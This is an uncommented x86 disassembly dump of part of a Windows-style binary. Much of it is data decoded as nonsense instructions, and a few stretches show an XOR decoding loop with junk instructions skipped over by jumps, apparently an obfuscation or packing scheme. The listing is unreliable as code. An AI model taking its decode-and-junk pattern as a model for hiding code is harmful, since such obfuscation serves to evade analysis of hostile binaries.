  40494a:	sbb    eax,0x62b0807a
  40494f:	push   ecx
  404950:	dec    eax
  404951:	cmp    eax,DWORD PTR [ebp+0x4bd537a6]
  404957:	push   0xffffffb2
  404959:	inc    edi
  40495a:	inc    ebx
  40495b:	jmp    0xee7f5d8d
  404960:	aam    0xb1
  404962:	jle    0x4049cf
  404964:	sub    ecx,edi
  404966:	adc    al,0x75
  404968:	push   ds
  404969:	test   dh,bh
  40496b:	jne    0x404977
  40496d:	(bad)  [eax+0x62]
  404970:	mov    ebx,0xbea59d1b
  404975:	mov    DWORD PTR cs:[esi+0x418fe55e],0xf2f18091
  404980:	in     eax,dx
  404981:	lahf   
  404982:	ret    0xe2a9
  404985:	(bad)  
  404987:	(bad)  
  404989:	jae    0x4049eb
  40498b:	fisub  WORD PTR [ebx-0x1d3aa276]
  404991:	cmp    eax,0x8fb9945f
  404996:	hlt    
  404997:	mov    edx,0x90b0cbd2
  40499c:	fiadd  DWORD PTR [eax+0x4d]
  40499f:	fiadd  WORD PTR [ebp-0x34]
  4049a2:	fild   DWORD PTR [edi-0x2f282c41]
  4049a8:	leave  
  4049a9:	cli    
  4049aa:	(bad)  
  4049ab:	imul   ebp,DWORD PTR [ecx],0xe4486ec1
  4049b1:	nop    DWORD PTR [edi-0x73124f43]
  4049b8:	xchg   ebx,eax
  4049b9:	das    
  4049ba:	cmp    bh,cl
  4049bc:	xlat   BYTE PTR ds:[ebx]
  4049bd:	dec    esp
  4049be:	mov    al,ds:0x354ed852
  4049c3:	jbe    0x4049ee
  4049c5:	or     ebx,ebp
  4049c7:	inc    ebp
  4049c8:	je     0x404a2e
  4049ca:	cld    
  4049cb:	das    
  4049cc:	retf   
  4049cd:	lods   al,BYTE PTR ds:[esi]
  4049ce:	call   0xe6a4:0x587b5d98
  4049d5:	int    0x2d
  4049d7:	jge    0x4049c7
  4049d9:	jns    0x40495f
  4049db:	inc    edx
  4049dc:	inc    cx
  4049de:	and    al,0x57
  4049e0:	mov    edi,DWORD PTR [ebp+0x8]
  4049e3:	sbb    DWORD PTR ds:0x43361b,ebx
  4049e9:	mov    eax,0x8a3a
  4049ee:	xor    DWORD PTR ds:0x4335b3,0x2227
  4049f8:	xor    ax,WORD PTR [edi+edx*4+0x2]
  4049fd:	movzx  edi,WORD PTR ds:0x433553
  404a04:	sbb    DWORD PTR ds:0x4335f3,edi
  404a0a:	mov    edi,0x3b00
  404a0f:	add    DWORD PTR ds:0x433623,0x4335f3
  404a19:	add    ax,di
  404a1c:	movzx  eax,ax
  404a1f:	mov    DWORD PTR [ebp-0x14],eax
  404a22:	mov    eax,DWORD PTR [ebp+0x8]
  404a25:	movzx  eax,WORD PTR [eax+edx*4]
  404a29:	xor    eax,0x8a3a
  404a2e:	xor    DWORD PTR ds:0x433633,0x619a
  404a38:	add    eax,edi
  404a3a:	mov    edi,DWORD PTR [ebp-0x14]
  404a3d:	mov    BYTE PTR [ebp+edi*1-0x58],al
  404a41:	mov    eax,DWORD PTR [ebp-0xc]
  404a44:	inc    edx
  404a45:	cmp    edx,eax
  404a47:	jne    0x4049e0
  404a4d:	pop    edi
  404a4e:	pop    ebx
  404a4f:	mov    eax,DWORD PTR [ebp-0x8]
  404a52:	mov    edx,DWORD PTR [ebp+0x10]
  404a55:	xor    eax,ecx
  404a57:	add    eax,esi
  404a59:	mov    DWORD PTR [edx],eax
  404a5b:	mov    eax,DWORD PTR [ebp-0x8]
  404a5e:	jmp    0x404c30
  404a63:	das    
  404a64:	or     DWORD PTR [eax-0x16825d93],eax
  404a6a:	pop    ebp
  404a6b:	out    0xe3,al
  404a6d:	sub    ecx,DWORD PTR [ebx-0x33]
  404a70:	inc    ebp
  404a71:	pop    ss
  404a72:	or     DWORD PTR [ebp+ebp*1+0x7fab7c7c],eax
  404a79:	jl     0x404af7
  404a7b:	or     ebx,ebx
  404a7d:	pop    eax
  404a7e:	pop    ebp
  404a7f:	push   ebp
  404a80:	mov    ch,0x11
  404a82:	push   esi
  404a83:	lods   al,BYTE PTR ds:[esi]
  404a84:	mov    bh,BYTE PTR [ebx]
  404a86:	push   es
  404a87:	xor    dl,BYTE PTR [edi-0x3595ac2]
  404a8d:	push   0xffffffe1
  404a8f:	(bad)  
  404a90:	cwd    
  404a92:	outs   dx,BYTE PTR ds:[esi]
  404a93:	jbe    0x404a31
  404a95:	fwait
  404a96:	dec    eax
  404a97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a99:	(bad)
  404a9c:	aas    
  404a9d:	mov    esi,0x42d4a869
  404aa2:	jnp    0x404a61
  404aa4:	inc    esi
  404aa5:	pusha  
  404aa6:	scas   eax,DWORD PTR es:[edi]
  404aa7:	not    bh
  404aa9:	jno    0x404a56
  404aab:	push   esi
  404aac:	xchg   BYTE PTR [esi],bl
  404aae:	addr16 in al,dx
  404ab0:	ss loopne 0x404ac3
  404ab3:	jg     0x404ad9
  404ab5:	ret    
  404ab6:	ficomp WORD PTR [edi+0x0]
  404ab9:	dec    ebp
  404aba:	push   eax
  404abb:	jno    0x404acd
  404abd:	imul   edx,DWORD PTR [ebx+0x6c],0xb0a3be11
  404ac4:	sub    eax,0xc1a13fff
  404ac9:	mov    ds:0x58e551ef,al
  404ace:	imul   esi,DWORD PTR [eax-0x35],0xffffff96
  404ad2:	(bad)  
  404ad3:	jb     0x404b11
  404ad5:	sbb    al,0x62
  404ad7:	repnz cmc 
  404ad9:	mov    esi,0x6cabd4aa
  404ade:	sbb    al,0xb5
  404ae0:	sub    al,0x49
  404ae2:	sbb    BYTE PTR [eax],dl
  404ae4:	packuswb mm4,mm2
  404ae7:	test   eax,0xa6db9dd6
  404aec:	sub    edi,DWORD PTR [esi]
  404aee:	les    esi,FWORD PTR [edx+eiz*4+0x2c]
  404af2:	fdivr  QWORD PTR [edi+0x52]
  404af5:	out    dx,eax
  404af6:	cld    
  404af7:	les    edi,FWORD PTR [ebp+0x24]
  404afa:	sbb    ebp,DWORD PTR [ebp+0x6a]
  404afd:	aas    
  404afe:	inc    ecx
  404aff:	lods   eax,DWORD PTR ds:[esi]
  404b00:	push   edx
  404b01:	jle    0x404aa5
  404b03:	jmp    0x404a9d
  404b05:	repnz loop 0x404b5e
  404b08:	pop    ds
  404b09:	retf   
  404b0a:	cld    
  404b0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b0c:	push   esp
  404b0d:	(bad)  
  404b0e:	sbb    esp,esi
  404b10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b11:	add    eax,0xfd38c255
  404b16:	and    cl,bh
  404b18:	mov    al,BYTE PTR [edx]
  404b1a:	or     BYTE PTR [eax],cl
  404b1c:	mov    ?,esp
  404b1e:	add    dh,ch
  404b20:	stc    
  404b21:	shl    dl,0x4a
  404b24:	sti    
  404b25:	push   eax
  404b26:	nop
  404b27:	sti    
  404b28:	jmp    0x59602a4f
  404b2d:	pop    ss
  404b2e:	popf   
  404b2f:	mov    BYTE PTR [ebp+0x42f6fe87],cl
  404b35:	mov    esp,0x9bbcd899
  404b3a:	aam    0x7
  404b3c:	jecxz  0x404bb9
  404b3e:	adc    al,0x8b
  404b40:	add    eax,0x22b61470
  404b45:	cld    
  404b46:	imul   esi,DWORD PTR ss:[ecx+0x76751801],0x10
  404b4e:	add    esp,DWORD PTR [edx+ebx*1]
  404b51:	ins    DWORD PTR es:[edi],dx
  404b52:	pop    es
  404b53:	test   eax,0x3d030adb
  404b58:	jns    0x404bba
  404b5a:	mov    ebp,0xb4f0edbb
  404b5f:	sti    
  404b60:	inc    edi
  404b61:	call   0x9436:0xc7573d57
  404b68:	repnz rcr edx,cl
  404b6b:	inc    ecx
  404b6c:	fs dec eax
  404b6e:	test   DWORD PTR [ecx],eax
  404b70:	mov    ebp,0x744ed819
  404b75:	inc    ecx
  404b76:	and    bl,BYTE PTR [ecx-0x36]
  404b79:	pop    ecx
  404b7a:	(bad)  
  404b7b:	mov    esp,0x8fa0d0a6
  404b80:	push   ebx
  404b81:	ret    
  404b82:	sub    cl,BYTE PTR [esi+0x23]
  404b85:	add    al,0x5b
  404b87:	vpsubusb xmm2,xmm6,XMMWORD PTR [eax+edx*4+0x24]
  404b8d:	jle    0x404bf1
  404b8f:	add    eax,DWORD PTR [ecx+0x21]
  404b92:	mov    edx,DWORD PTR [ebp-0xf]
  404b95:	or     DWORD PTR [edx+0x7e],esp
  404b98:	sub    edi,DWORD PTR [ebp+0x37d76854]
  404b9e:	sub    esp,DWORD PTR [edx+0xd2384be]
  404ba4:	and    bl,BYTE PTR [ebx-0x7cf85ac4]
  404baa:	pop    esp
  404bab:	mov    ecx,ebx
  404bad:	sub    DWORD PTR [ebp+0x18f65be4],eax
  404bb3:	sbb    dh,dl
  404bb5:	(bad)  
  404bb6:	outs   dx,BYTE PTR ds:[esi]
  404bb7:	cdq    
  404bb8:	imul   ecx,DWORD PTR [ebx],0x8
  404bbb:	mov    eax,esp
  404bbd:	(bad)  
  404bbe:	sbb    al,0x73
  404bc0:	inc    esi
  404bc1:	shl    edx,0xaf
  404bc4:	mov    bl,cl
  404bc6:	sub    bl,BYTE PTR [ebx-0x4881b907]
  404bcc:	fcomp  DWORD PTR [ebx]
  404bce:	cmp    al,BYTE PTR [ecx]
  404bd0:	and    esi,esi
  404bd2:	(bad)  
  404bd3:	sub    al,0x33
  404bd5:	mov    ch,0x52
  404bd7:	jmp    0xe88a6da8
  404bdc:	jp     0x404bd4
  404bde:	ins    DWORD PTR es:[edi],dx
  404bdf:	inc    ebx
  404be0:	sar    DWORD PTR [ebp+0x683941dd],1
  404be6:	pop    ss
  404be7:	mov    ebx,0xc628b5b
  404bec:	loope  0x404bcc
  404bee:	xor    al,0xbe
  404bf0:	add    al,0x8b
  404bf2:	pushf  
  404bf3:	and    al,0x82
  404bf5:	jecxz  0x404c19
  404bf7:	mov    al,ds:0xab85b90c
  404bfc:	push   0x1e
  404bfe:	popf   
  404bff:	adc    BYTE PTR [edx],dh
  404c01:	dec    eax
  404c02:	scas   al,BYTE PTR es:[edi]
  404c03:	sti    
  404c04:	mov    ds,WORD PTR [ebp-0x5e4f9e8a]
  404c0a:	ror    cl,1
  404c0c:	daa    
  404c0d:	mov    esp,0xb1b48e51
  404c12:	imul   ebp,DWORD PTR ds:0xf63bb89f,0xffffff86
  404c19:	repnz cmp dh,bh
  404c1c:	mov    eax,0x8d0fe0cc
  404c21:	xor    esp,DWORD PTR [edx+0x5d91f65f]
  404c27:	hlt    
  404c28:	addr16 push es
  404c2a:	add    BYTE PTR [eax],bl
  404c2c:	ins    DWORD PTR es:[edi],dx
  404c2d:	push   edi
  404c2e:	or     esp,edi
  404c30:	xor    eax,ecx
  404c32:	add    eax,esi
  404c34:	mov    DWORD PTR [ebp+0x8],eax
  404c37:	mov    eax,DWORD PTR [ebp+0x8]
  404c3a:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  404c3e:	mov    dl,BYTE PTR [ebp-0x1]
  404c41:	cmp    al,dl
  404c43:	je     0x40502a
  404c49:	mov    eax,DWORD PTR [ebp+0x8]
  404c4c:	jmp    0x404e1e
  404c51:	adc    al,0xc9
  404c53:	mulps  xmm2,xmm1
  404c56:	pop    ecx
  404c57:	jbe    0x404cca
  404c59:	sti    
  404c5a:	lahf   
  404c5b:	dec    ecx
  404c5c:	xchg   ebx,eax
  404c5d:	mov    cl,BYTE PTR [esi+0x1e]
  404c60:	sub    al,0x33
  404c62:	das    
  404c63:	jl     0x404ce1
  404c65:	stos   DWORD PTR es:[edi],eax
  404c66:	jg     0x404ce4
  404c68:	jl     0x404c44
  404c6a:	cmp    al,0x4c
  404c6c:	pop    edi
  404c6d:	mov    edi,0xb1896503
  404c72:	fnstcw WORD PTR [edx-0xc]
  404c75:	enter  0xad60,0xba
  404c79:	mov    al,0xa
  404c7b:	xchg   BYTE PTR [eax+0x78],bh
  404c7e:	push   ebp
  404c7f:	adc    eax,0x611c1745
  404c84:	lock call 0x1d6d:0x53a4d07a
  404c8c:	nop
  404c8d:	push   0x2da9dffe
  404c92:	push   es
  404c93:	aas    
  404c94:	xor    bl,al
  404c96:	aas    
  404c97:	jb     0x404c58
  404c99:	push   ebx
  404c9a:	enter  0x3cdb,0xa2
  404c9e:	mov    bh,0x55
  404ca0:	pop    ebx
  404ca1:	imul   esi,DWORD PTR [ebp+0x4d],0x55c9d49f
  404ca8:	(bad)  
  404ca9:	pop    DWORD PTR [edi-0x3e]
  404cac:	jns    0x404c68
  404cae:	pop    ebx
  404caf:	outs   dx,BYTE PTR ds:[esi]
  404cb0:	(bad)  
  404cb1:	mov    eax,ds:0xd26c3c04
  404cb6:	xor    BYTE PTR ds:0xde24d410,0xb6
  404cbd:	and    eax,0x70234266
  404cc2:	sbb    al,BYTE PTR [edi-0x5c5644e3]
  404cc8:	call   0xc52f278c
  404ccd:	ret    
  404cce:	in     al,0x9d
  404cd0:	jo     0x404d25
  404cd2:	aas    
  404cd3:	jne    0x404cda
  404cd5:	mov    bl,0xa9
  404cd7:	push   0xe929a327
  404cdc:	fdiv   DWORD PTR [eax-0x2121a19c]
  404ce2:	das    
  404ce3:	cld    
  404ce4:	push   edx
  404ce5:	or     al,0xbf
  404ce7:	inc    eax
  404ce8:	jno    0x404ce9
  404cea:	cmp    BYTE PTR [edx-0x4744365a],ah
  404cf0:	pop    esp
  404cf1:	sbb    BYTE PTR [esp+ebx*4],0x66
  404cf5:	rcr    DWORD PTR [edi],0x73
  404cf8:	hlt    
  404cf9:	xlat   BYTE PTR ds:[ebx]
  404cfa:	mov    edx,0x208c8a77
  404cff:	mov    dh,0x25
  404d01:	in     al,dx
  404d02:	dec    ebx
  404d03:	xor    edi,DWORD PTR [ebp+0x49d3b655]
  404d09:	xchg   ecx,eax
  404d0a:	jecxz  0x404ca0
  404d0c:	ds ret 
  404d0e:	and    al,0xb3
  404d10:	mov    ebx,0x1716d757
  404d15:	je     0x404cb3
  404d17:	retf   0x71a4
  404d1a:	in     eax,0xbb
  404d1c:	rcr    BYTE PTR [ebp-0x3de342bd],cl
  404d22:	mov    ch,bl
  404d24:	outs   dx,BYTE PTR ds:[esi]
  404d25:	loopne 0x404cb2
  404d27:	jno    0x404ccc
  404d29:	mov    bh,0xfb
  404d2b:	lods   eax,DWORD PTR ds:[esi]
  404d2c:	mov    cl,0x5f
  404d2e:	inc    ebx
  404d2f:	out    0x55,eax
  404d31:	icebp  
  404d32:	lahf   
  404d33:	push   ss
  404d34:	xor    eax,0xb1cc5e3b
  404d39:	inc    ecx
  404d3a:	icebp  
  404d3b:	enter  0xdf7b,0x68
  404d3f:	push   es
  404d40:	ins    BYTE PTR es:[edi],dx
  404d41:	shl    DWORD PTR [edx+0x74],0xd8
  404d45:	jo     0x404cde
  404d47:	push   esi
  404d48:	loop   0x404d3a
  404d4a:	mov    bl,0x4b
  404d4c:	adc    eax,0x7dc02ba7
  404d51:	retf   0x3f50
  404d54:	test   eax,0xe401c89a
  404d59:	(bad)  
  404d5a:	pop    edi
  404d5b:	cmp    cl,BYTE PTR [edx+0x72]
  404d5e:	xor    ebp,edx
  404d60:	push   ecx
  404d61:	in     eax,dx
  404d62:	add    DWORD PTR [ebx+0x2a],ecx
  404d65:	aas    
  404d66:	int    0x7d
  404d68:	not    DWORD PTR [eax-0x50]
  404d6b:	and    BYTE PTR [edx-0x2dfcddfc],bl
  404d71:	cmc    
  404d72:	cmp    al,bl
  404d74:	addr16 retf 0x2800
  404d78:	icebp  
  404d79:	in     eax,dx
  404d7a:	fcmovnu st,st(2)
  404d7c:	retf   
  404d7d:	xchg   esi,eax
  404d7e:	inc    ecx
  404d7f:	dec    edx
  404d80:	ret    
  404d81:	jns    0x404dfe
  404d83:	jns    0x404d60
  404d85:	leave  
  404d86:	sub    ch,ch
  404d88:	lds    eax,FWORD PTR [ecx]
  404d8a:	std    
  404d8b:	jmp    0xf25:0xc97449fb
  404d92:	sub    al,0x36
  404d94:	pop    esp
  404d95:	pop    es
  404d96:	jne    0x404dd3
  404d98:	out    dx,eax
  404d99:	dec    edi
  404d9a:	mov    eax,DWORD PTR [eax]
  404d9c:	aas    
  404d9d:	add    edx,edx
  404d9f:	jmp    0xf30e:0xfd852ce3
  404da6:	push   edi
  404da7:	mov    esp,DWORD PTR [edi+0x50972c0f]
  404dad:	inc    esi
  404dae:	jecxz  0x404dac
  404db0:	mov    esi,0xc7bd2e11
  404db5:	outs   dx,DWORD PTR ds:[esi]
  404db6:	and    DWORD PTR [esi-0x1],ecx
  404db9:	popa   
  404dba:	retf   
  404dbb:	fisubr WORD PTR [ebx]
  404dbd:	cmp    edi,ebp
  404dbf:	inc    esp
  404dc0:	push   esp
  404dc1:	dec    esi
  404dc2:	add    ebx,DWORD PTR [eax+0x7d486ffc]
  404dc8:	pushf  
  404dc9:	push   es
  404dca:	xchg   edx,eax
  404dcb:	add    ah,ah
  404dcd:	cmp    al,0x93
  404dcf:	into   
  404dd0:	cmp    BYTE PTR [ebx-0x4e],cl
  404dd3:	xor    al,0x2f
  404dd5:	scas   al,BYTE PTR es:[edi]
  404dd6:	inc    edi
  404dd7:	push   esp
  404dd8:	in     eax,dx
  404dd9:	or     ebx,DWORD PTR [ecx+0x63]
  404ddc:	jle    0x404dfc
  404dde:	mov    esi,0x616118e7
  404de3:	jbe    0x404e38
  404de5:	push   esp
  404de6:	inc    ecx
  404de7:	outs   dx,DWORD PTR ds:[esi]
  404de8:	arpl   dx,bx
  404dea:	push   ebp
  404deb:	adc    ebp,DWORD PTR ds:0xca454691
  404df1:	fldcw  WORD PTR [ebx]
  404df3:	ficom  DWORD PTR [eax-0xa]
  404df6:	sub    DWORD PTR [ebx+0x1f],ebp
  404df9:	out    0xf9,al
  404dfb:	dec    ebx
  404dfc:	xchg   ebp,eax
  404dfd:	jo     0x404e3a
  404dff:	fidivr WORD PTR [ecx-0x4cd9e3bc]
  404e05:	pop    ds
  404e06:	cmp    cl,BYTE PTR [ebx-0x1e3fb700]
  404e0c:	cdq    
  404e0d:	adc    BYTE PTR [esi+0x1c5e22b4],dl
  404e13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e14:	daa    
  404e15:	mov    eax,ds:0x76de02c1
  404e1a:	xor    edx,DWORD PTR [edi]
  404e1c:	sbb    BYTE PTR [edx],al
  404e1e:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  404e22:	mov    edx,DWORD PTR [ebp+0xc]
  404e25:	cmp    al,BYTE PTR [edx]
  404e27:	jne    0x405222
  404e2d:	mov    eax,DWORD PTR [ebp-0x8]
  404e30:	mov    edx,DWORD PTR [ebp+0xc]
  404e33:	movsx  edx,BYTE PTR [edx]
  404e36:	xor    eax,ecx
  404e38:	jmp    0x40500a
  404e3d:	test   BYTE PTR [ecx-0x28a15a6],dh
  404e43:	xchg   esp,eax
  404e44:	jge    0x404e3a
  404e46:	int    0x4b
  404e48:	add    eax,0xbea634ac
  404e4d:	outs   dx,BYTE PTR ds:[esi]
  404e4e:	cs jl  0x404ecd
  404e51:	stos   DWORD PTR es:[edi],eax
  404e52:	jg     0x404ed0
  404e54:	jl     0x404e73
  404e56:	push   ecx
  404e57:	js     0x404e05
  404e59:	jle    0x404ed3
  404e5b:	sub    bl,BYTE PTR fs:[edx+0x2b5ee120]
  404e62:	cmp    edx,DWORD PTR [edi-0x57]
  404e65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e66:	repz pop es
  404e68:	imul   edi,DWORD PTR [ebp-0x7c4c6826],0x13d82cd9
  404e72:	dec    ebx
  404e73:	ds xor eax,0xd2a165fc
  404e79:	mov    ah,0x52
  404e7b:	xchg   esi,eax
  404e7c:	scas   al,BYTE PTR es:[edi]
  404e7d:	xor    esi,DWORD PTR [ebx-0x6d]
  404e80:	dec    edi
  404e81:	sbb    esi,DWORD PTR [eax-0x6b1d01c4]
  404e87:	shl    DWORD PTR [ecx+0x3119cf2d],cl
  404e8d:	add    al,0xe9
  404e8f:	adc    eax,0x3da4df07
  404e94:	clc    
  404e95:	xchg   ebx,eax
  404e96:	jmp    0xbeb87d98
  404e9b:	cmp    ecx,edi
  404e9d:	and    eax,0x4dc82c24
  404ea2:	cwde   
  404ea3:	jno    0x404e69
  404ea5:	call   0xd666:0xedb903a7
  404eac:	int3   
  404ead:	pop    edx
  404eae:	push   ecx
  404eaf:	xor    BYTE PTR [ebx],cl
  404eb1:	push   0xe9808d28
  404eb6:	retf   0xae7e
  404eb9:	outs   dx,DWORD PTR ds:[esi]
  404eba:	je     0x404eaa
  404ebc:	xor    bh,BYTE PTR [ecx+edx*8-0x49bd426e]
  404ec3:	mov    esp,0xfa508f55
  404ec8:	or     edi,DWORD PTR [ebp+0x2b]
  404ecb:	xchg   esi,eax
  404ecc:	ret    0x67aa
  404ecf:	into   
  404ed0:	xor    al,0x40
  404ed2:	cmc    
  404ed3:	xchg   edx,eax
  404ed4:	sub    al,0x7c
  404ed6:	ret    
  404ed7:	sbb    edi,DWORD PTR [edx]
  404ed9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404eda:	addr16 xchg ebp,eax
  404edc:	mov    ah,0x7c
  404ede:	daa    
  404edf:	and    DWORD PTR [ecx-0x50a96daa],ebx
  404ee5:	and    al,0x7d
  404ee7:	sbb    eax,0x8ead681f
  404eec:	xchg   ebx,eax
  404eed:	fisub  DWORD PTR ds:0x9e870654
  404ef3:	pop    ebx
  404ef4:	scas   al,BYTE PTR es:[edi]
  404ef5:	test   eax,0x2da9ded4
  404efa:	scas   eax,DWORD PTR es:[edi]
  404efb:	dec    ebp
  404efc:	test   eax,0x620e891f
  404f01:	fdivr  QWORD PTR [ecx+0x46]
  404f04:	test   al,0xa0
  404f06:	mov    ebx,0x7998da6d
  404f0b:	xchg   edx,eax
  404f0c:	or     al,0xea
  404f0e:	cmp    DWORD PTR [ecx-0x5f],ebx
  404f11:	add    eax,0x3e70657c
  404f16:	mov    ah,0x7e
  404f18:	pop    edi
  404f19:	imul   eax,DWORD PTR [esi+0x7e],0xffffffd8
  404f1d:	retf   
  404f1e:	jmp    0x404f49
  404f20:	stos   DWORD PTR es:[edi],eax
  404f21:	arpl   dx,bx
  404f23:	in     al,dx
  404f24:	push   ds
  404f25:	dec    eax
  404f26:	mov    ecx,0xbaa2c7fd
  404f2b:	dec    eax
  404f2c:	out    dx,eax
  404f2d:	iret   
  404f2e:	sbb    bl,bl
  404f30:	sub    edx,edx
  404f32:	sub    al,0xad
  404f34:	cdq    
  404f35:	rcr    BYTE PTR [esp+esi*4+0x21704304],1
  404f3c:	(bad)  
  404f3d:	or     DWORD PTR [eax],0x3ce14ade
  404f43:	test   DWORD PTR [ebp+0x7f],eax
  404f46:	pop    ds
  404f47:	xor    BYTE PTR [edx],0xf2
  404f4a:	mov    esi,0x86b39304
  404f4f:	push   0xffffffea
  404f51:	ja     0x404f5b
  404f53:	cmp    DWORD PTR [edx],ebx
  404f55:	or     dh,BYTE PTR [ebx+0x32efb6e1]
  404f5b:	mov    al,ds:0x28f88bc9
  404f60:	xchg   al,bl
  404f62:	pop    esi
  404f63:	sti    
  404f64:	cmp    eax,0x9c61ace5
  404f69:	or     ecx,DWORD PTR [esi+0x6d]
  404f6c:	mov    eax,0x91e653e7
  404f71:	das    
  404f72:	(bad)  
  404f73:	sbb    BYTE PTR [ecx],dl
  404f75:	jecxz  0x404f74
  404f77:	inc    esi
  404f78:	je     0x404f18
  404f7a:	mov    ebp,0x35369c9a
  404f7f:	sub    BYTE PTR [ecx+0x3f90920a],ah
  404f85:	sub    BYTE PTR [ecx],al
  404f87:	pop    es
  404f88:	jl     0x404ff5
  404f8a:	out    dx,eax
  404f8b:	lds    esp,FWORD PTR [esi]
  404f8d:	add    BYTE PTR [eax],0xc0
  404f90:	sub    eax,esp
  404f92:	add    ch,BYTE PTR [esp+ebx*1+0x4754e3dd]
  404f99:	jg     0x405001
  404f9b:	push   esi
  404f9c:	cmp    ebx,DWORD PTR [ebx-0x80]
  404f9f:	lods   al,BYTE PTR ds:[esi]
  404fa0:	sub    eax,0xcd83f60a
  404fa5:	out    0x9e,eax
  404fa7:	out    0x96,eax
  404fa9:	xchg   ebx,eax
  404faa:	mov    ebp,DWORD PTR [esi+0x22]
  404fad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404fae:	dec    ecx
  404faf:	xor    bh,dl
  404fb1:	jo     0x404fa5
  404fb3:	retf   0xe0cf
  404fb6:	mov    dl,0x1
  404fb8:	push   ebp
  404fb9:	pusha  
  404fba:	adc    DWORD PTR [esi],0xffffffb7
  404fbd:	loopne 0x404fd2
  404fbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404fc0:	stos   BYTE PTR es:[edi],al
  404fc1:	push   ecx
  404fc2:	iret   
  404fc3:	jl     0x404fd9
  404fc5:	in     eax,0x98
  404fc7:	and    eax,0x663131f
  404fcc:	sbb    esp,DWORD PTR [edi]
  404fce:	fsubr  st,st(3)
  404fd0:	adc    eax,0xc61a68d7
  404fd5:	push   ds
  404fd6:	xchg   ecx,eax
  404fd7:	xor    edx,edi
  404fd9:	push   0xc2defa
  404fde:	mov    ah,0x2f
  404fe0:	fld    TBYTE PTR [ecx+ecx*2]
  404fe3:	jnp    0x404f6b
  404fe5:	ins    BYTE PTR es:[edi],dx
  404fe6:	xor    DWORD PTR [edx],ecx
  404fe8:	and    eax,0xaf7cadb8
  404fed:	mov    ch,0x40
  404fef:	dec    esp
  404ff0:	adc    BYTE PTR [ecx],dl
  404ff2:	in     al,0x40
  404ff4:	adc    ch,BYTE PTR ss:[edx+0x34]
  404ff8:	add    al,BYTE PTR [esp+edi*8]
  404ffb:	inc    ebx
  404ffc:	xor    ecx,DWORD PTR [ecx+0x3fd70d4c]
  405002:	into   
  405003:	mov    ds:0x869a086e,al
  405008:	cmp    DWORD PTR ds:0xd03bc603,ebx
  40500e:	je     0x405216
  405014:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  40501b:	lea    eax,[ebp-0x18]
  40501e:	mov    DWORD PTR [ebp-0x14],eax
  405021:	mov    eax,DWORD PTR [ebp-0x14]
  405024:	add    DWORD PTR [eax],0x705fa8f
  40502a:	mov    eax,DWORD PTR [ebp-0x10]
  40502d:	mov    edx,DWORD PTR [ebp+0x8]
  405030:	xor    eax,ecx
  405032:	jmp    0x405204
  405037:	das    
  405038:	dec    ebx
  405039:	sbb    al,0x9b
  40503b:	pop    eax
  40503c:	imul   ebp,DWORD PTR [ebx-0x6bdfc3b5],0xfffffff0
  405043:	adc    BYTE PTR [ecx+0x57],bl
  405046:	stos   DWORD PTR es:[edi],eax
  405047:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405048:	sub    BYTE PTR [esp+edi*2-0x55],bh
  40504c:	jg     0x4050ca
  40504e:	jl     0x405050
  405050:	pop    edx
  405051:	or     BYTE PTR [ebx],ch
  405053:	mov    ecx,0xdc05634b
  405058:	push   edx
  405059:	sub    BYTE PTR [ebx-0x47],bh
  40505c:	jle    0x405064
  40505e:	push   0x20b62aeb
  405063:	sar    BYTE PTR [ebx],0x47
  405066:	pop    es
  405067:	cmp    DWORD PTR [esi-0x16e8a5c7],eax
  40506d:	cwde   
  40506e:	pop    edx
  40506f:	bound  edx,QWORD PTR [edi-0x5ba124c6]
  405075:	ret    0x516c
  405078:	xor    eax,0x353a9636
  40507d:	(bad)  
  40507e:	in     eax,dx
  40507f:	inc    esi
  405080:	ins    BYTE PTR es:[edi],dx
  405081:	mov    ebx,0xddc0ab6c
  405086:	inc    edi
  405087:	in     al,dx
  405088:	cmp    eax,0xd6dbdd3f
  40508d:	and    BYTE PTR [ecx+0x50ee558e],dh
  405093:	jg     0x40506a
  405095:	adc    BYTE PTR [ecx+esi*2],bh
  405098:	mul    DWORD PTR [edi+0x28]
  40509b:	cli    
  40509c:	sub    BYTE PTR [eax],al
  40509e:	addr16 xor eax,0x285f84bc
  4050a4:	inc    ebp
  4050a5:	cmp    DWORD PTR [ecx-0x36],ebx
  4050a8:	push   0x721d5ddc
  4050ad:	mov    bh,0x8d
  4050af:	pop    eax
  4050b0:	mov    ds:0x8f41fd3a,eax
  4050b5:	pop    edx
  4050b6:	push   ecx
  4050b7:	push   es
  4050b8:	aaa    
  4050b9:	inc    ebx
  4050ba:	fidiv  WORD PTR [eax]
  4050bc:	fnstcw WORD PTR [ecx+edi*1+0x27]
  4050c0:	jp     0x405087
  4050c2:	mov    cl,0xab
  4050c4:	dec    BYTE PTR [ebp+eiz*1+0x45]
  4050c8:	dec    DWORD PTR [ecx+0x278cf08e]
  4050ce:	mov    DWORD PTR [edx-0x48580fc7],ecx
  4050d4:	push   esp
  4050d5:	xor    DWORD PTR [edi+edi*1-0x29bb3689],ebx
  4050dc:	out    0x5b,al
  4050de:	pop    edx
  4050df:	xlat   BYTE PTR ds:[ebx]
  4050e0:	jp     0x405152
  4050e2:	dec    esi
  4050e3:	push   eax
  4050e4:	(bad)  
  4050e6:	cdq    
  4050e7:	sbb    BYTE PTR [edi-0x50],bl
  4050ea:	dec    esi
  4050eb:	scas   al,BYTE PTR es:[edi]
  4050ec:	push   eax
  4050ed:	inc    ebp
  4050ee:	sub    al,BYTE PTR [eax]
  4050f0:	jge    0x4050c2
  4050f2:	add    al,0x95
  4050f4:	pop    ss
  4050f5:	outs   dx,DWORD PTR ds:[esi]
  4050f6:	jbe    0x405118
  4050f8:	pusha  
  4050f9:	jbe    0x4050a5
  4050fb:	retf   0x223b
  4050fe:	in     al,0x12
  405100:	ret    
  405101:	xor    DWORD PTR [edi],eax
  405103:	sar    dh,cl
  405105:	ret    
  405106:	retf   
